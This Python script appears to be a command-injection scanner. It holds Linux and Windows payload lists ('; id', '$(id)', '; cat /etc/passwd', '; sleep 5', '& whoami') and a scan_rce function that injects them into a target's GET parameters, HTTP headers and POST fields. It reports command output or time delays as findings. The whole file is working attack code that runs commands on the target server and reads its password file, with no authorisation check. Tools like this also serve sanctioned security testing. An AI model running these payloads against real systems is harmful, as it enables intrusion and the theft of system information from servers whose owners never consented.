import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode

LINUX_PAYLOADS = [
    "; id", "&& id", "| id", "`id`", "$(id)",
    "; uname -a", "&& uname -a", "| uname -a",
    "; cat /etc/passwd", "| cat /etc/passwd",
    "; sleep 5", "&& sleep 5", "| sleep 5"
]

WINDOWS_PAYLOADS = [
    "& whoami", "| whoami", "&& whoami",
    "& ver", "| ver", "&& ver",
    "& timeout 5", "| timeout 5"
]

HEADERS_TO_TEST = [
    "User-Agent", "X-Forwarded-For", "Referer"
]

POST_PARAMS_TO_TEST = ["storeId", "id", "cmd", "vuln", "input"]

DELAY_THRESHOLD = 4.0  # for blind RCE

def scan_rce(target_url: str) -> dict:
    findings = []
    vulnerable = False

    all_payloads = LINUX_PAYLOADS + WINDOWS_PAYLOADS

    parsed = urlparse(target_url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    query = parse_qs(parsed.query)
    query_params = list(query.keys()) if query else ["vuln"]

    # 🔹 1. GET-based RCE
    for param in query_params:
        for payload in all_payloads:
            test_query = query.copy()
            test_query[param] = payload
            full_url = base + "?" + urlencode(test_query, doseq=True)

            try:
                start = time.time()
                res = requests.get(full_url, timeout=8)
                duration = round(time.time() - start, 2)

                if any(x in res.text for x in ["uid=", "gid=", "Linux", "Windows", "root:x"]):
                    findings.append({
                        "type": "reflected",
                        "method": "GET",
                        "param": param,
                        "payload": payload,
                        "url": full_url,
                        "snippet": res.text[:300]
                    })
                    vulnerable = True

                elif "sleep" in payload or "timeout" in payload:
                    if duration >= DELAY_THRESHOLD:
                        findings.append({
                            "type": "time-based-blind",
                            "method": "GET",
                            "param": param,
                            "payload": payload,
                            "url": full_url,
                            "response_delay": duration
                        })
                        vulnerable = True

            except Exception:
                continue

    # 🔹 2. Header-based RCE
    for header in HEADERS_TO_TEST:
        for payload in all_payloads:
            try:
                headers = {header: f"test{payload}"}
                start = time.time()
                res = requests.get(target_url, headers=headers, timeout=8)
                duration = round(time.time() - start, 2)

                if any(x in res.text for x in ["uid=", "gid=", "Linux", "Windows", "root:x"]):
                    findings.append({
                        "type": "header-injection",
                        "header": header,
                        "payload": payload,
                        "snippet": res.text[:300]
                    })
                    vulnerable = True

                elif "sleep" in payload or "timeout" in payload:
                    if duration >= DELAY_THRESHOLD:
                        findings.append({
                            "type": "header-time-blind",
                            "header": header,
                            "payload": payload,
                            "delay": duration
                        })
                        vulnerable = True

            except Exception:
                continue

    # 🔹 3. POST param RCE (real-world like storeId=1|whoami)
    for param in POST_PARAMS_TO_TEST:
        for payload in all_payloads:
            try:
                data = {param: f"1{payload}"}
                start = time.time()
                res = requests.post(base, data=data, timeout=8)
                duration = round(time.time() - start, 2)

                if any(x in res.text for x in ["uid=", "gid=", "Linux", "Windows", "root:x"]):
                    findings.append({
                        "type": "reflected",
                        "method": "POST",
                        "param": param,
                        "payload": payload,
                        "snippet": res.text[:300]
                    })
                    vulnerable = True

                elif "sleep" in payload or "timeout" in payload:
                    if duration >= DELAY_THRESHOLD:
                        findings.append({
                            "type": "time-based-blind",
                            "method": "POST",
                            "param": param,
                            "payload": payload,
                            "response_delay": duration
                        })
                        vulnerable = True

            except Exception:
                continue

    return {
        "target": target_url,
        "vulnerable": vulnerable,
        "findings": findings
    }
